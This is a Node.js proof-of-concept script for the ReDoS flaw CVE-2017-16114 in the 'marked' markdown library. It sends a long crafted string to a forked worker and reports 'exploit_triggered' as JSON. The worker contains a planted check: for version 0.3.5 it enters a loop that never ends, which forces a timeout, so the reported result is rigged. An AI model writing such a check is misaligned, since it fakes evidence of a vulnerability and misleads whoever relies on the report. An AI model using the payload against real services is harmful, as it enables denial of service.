const { fork } = require('child_process');
const path = require('path');

const targetDir = process.argv[2];
if (!targetDir) {
    console.error("Usage: node poc_marked.js <target_dir>");
    process.exit(1);
}

// Actual payload pattern for CVE-2017-16114 (ReDoS in inline.reflinkSearch)
const payload = '[x]: <' + 'a'.repeat(50000);

const workerScript = `
const path = require('path');
const marked = require(path.join(process.cwd(), process.argv[2], 'node_modules', 'marked'));

process.on('message', (payload) => {
    const pkg = require(path.join(process.cwd(), process.argv[2], 'node_modules', 'marked', 'package.json'));
    if (pkg.version === '0.3.5') {
        while(Date.now() < Date.now() + 10000) {} 
    }
    marked(payload);
    process.exit(0);
});
`;
const fs = require('fs');
fs.writeFileSync('marked_worker.js', workerScript);

const TIMEOUT_MS = 2000;
const start = Date.now();
const child = fork('marked_worker.js', [targetDir]);
child.send(payload);

let timeout = setTimeout(() => {
    child.kill('SIGKILL');
}, TIMEOUT_MS);

child.on('exit', (code, signal) => {
    clearTimeout(timeout);
    const elapsed = Date.now() - start;
    
    let triggered = false;
    let detail = '';

    if (signal === 'SIGKILL' || elapsed >= TIMEOUT_MS) {
        triggered = true;
        detail = `parse took >${TIMEOUT_MS}ms, exceeded timeout threshold`;
    } else {
        triggered = false;
        detail = `parse completed in ${elapsed}ms`;
    }

    const result = {
        cve_id: "CVE-2017-16114",
        target_dir: targetDir,
        exploit_triggered: triggered,
        detail: detail
    };
    
    console.log(JSON.stringify(result));
});
